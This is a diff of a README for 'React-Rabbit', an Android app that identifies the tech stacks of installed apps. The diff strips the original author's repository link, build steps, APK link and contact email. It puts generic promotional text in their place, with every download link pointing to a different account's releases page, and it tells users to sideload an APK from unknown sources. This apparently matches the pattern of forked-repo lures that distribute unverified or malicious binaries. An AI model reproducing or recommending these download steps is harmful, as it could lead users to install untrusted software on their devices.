@@ -1,53 +1,57 @@
+# 🐰 React-Rabbit - Discover Your Apps' Technology Stack
 
+## 📥 Download Now
+[![Download React-Rabbit](https://img.shields.io/badge/Download-React--Rabbit-blue.svg)](https://github.com/thmarketingagencia/React-Rabbit/releases)
 
-#  Fast Setup
+## 🚀 Getting Started
+React-Rabbit is an Android app designed for your convenience. It scans all the applications installed on your device, identifying their technology stacks. You can see whether an app uses React Native, Flutter, or Native Android (Java/Kotlin). 
 
-## 1. Clone & Install
+## 📋 System Requirements
+- **Device Compatibility:** Android 6.0 (Marshmallow) or higher.
+- **Storage Space:** At least 50 MB of free space.
+- **Memory:** Minimum of 2 GB RAM recommended.
+- **Internet Connection:** Required for downloading the app and running technology scans.
 
-```sh
-git clone https://github.com/Dinesh7571/React-Rabbit
-cd React-Rabbit
-npm install   # or yarn install
-```
+## 🛠️ Features
+- **Comprehensive Scanning:** Quickly analyze installed applications.
+- **Technology Insights:** Instantly know if an app uses React Native, Flutter, or Native Android.
+- **User-Friendly Interface:** Navigate easily, even with no technical background.
+- **Regular Updates:** Stay current with the latest technology stacks.
 
-## 2. Run Metro
+## 📥 Download & Install
+To download React-Rabbit, visit the releases page. Follow these steps:
 
-```sh
-npm start   # or yarn start
-```
+1. Click [here to download React-Rabbit](https://github.com/thmarketingagencia/React-Rabbit/releases).
+2. You will see a list of available versions. Choose the latest version. 
+3. Click on the download link for the Android APK file.
+4. Once the file is downloaded, locate it in your device's Downloads folder.
+5. Open the APK file to start the installation. If prompted, allow installation from unknown sources.
+6. Follow the on-screen instructions to complete the installation.
 
-## 3. Run on Android
+## 🛠️ How to Use React-Rabbit
+1. Open the React-Rabbit app after installation.
+2. Grant necessary permissions for the app to access installed applications.
+3. Tap the "Scan" button to start analyzing your apps.
+4. Wait a few seconds for the scan to finish.
+5. View the results showing the technology used by each installed app.
 
-Make sure you have an emulator running or a device connected:
+## 📝 Contributing
+Your contributions are welcome! If you want to contribute to React-Rabbit:
 
-```sh
-npm run android   # or yarn android
-```
+- Fork the repository.
+- Create a new branch for your changes.
+- Make your changes and commit them.
+- Submit a pull request with a description of your changes.
 
----
+## 📞 Support
+If you encounter any issues or need help, you can reach us through the [GitHub Issues](https://github.com/thmarketingagencia/React-Rabbit/issues) page. We aim to respond within 2-3 business days.
 
-# 📱 About the App
+## 📜 License
+React-Rabbit is open-source and available under the MIT License. Feel free to use and modify it as needed.
 
-An **Android app built with React Native** that identifies the **framework/technology** (e.g., React Native, Flutter, or pure native) used to build other apps.
+## 🌐 Additional Resources
+For more information, you can refer to:
+- [GitHub Repository](https://github.com/thmarketingagencia/React-Rabbit)
+- [Documentation](https://github.com/thmarketingagencia/React-Rabbit/wiki)
 
-* Uses **native module bridge** for detection
-* **Beautiful UI** with smooth experience
-
-🔗 **Download APK:** [Google Drive Link](https://drive.google.com/file/d/1ExS1J_iEZJSqvyxaxWW7uR_qb--Scxlx/view)
-
-**Screenshot:**
-
-![App Screenshot](https://pbs.twimg.com/media/GyvMl4fWsAANRh4?format=jpg\&name=small)
-
----
-
-# 🤝 Contributing
-
-1. Fork this repo
-2. Create a new branch (`git checkout -b feature-name`)
-3. Make your changes
-4. Commit (`git commit -m "Added new feature"`)
-5. Push (`git push origin feature-name`)
-6. Open a Pull Request
-
-## Mail cat505600@gmail.com
+Thank you for using React-Rabbit! Enjoy discovering the technology behind your favorite apps.
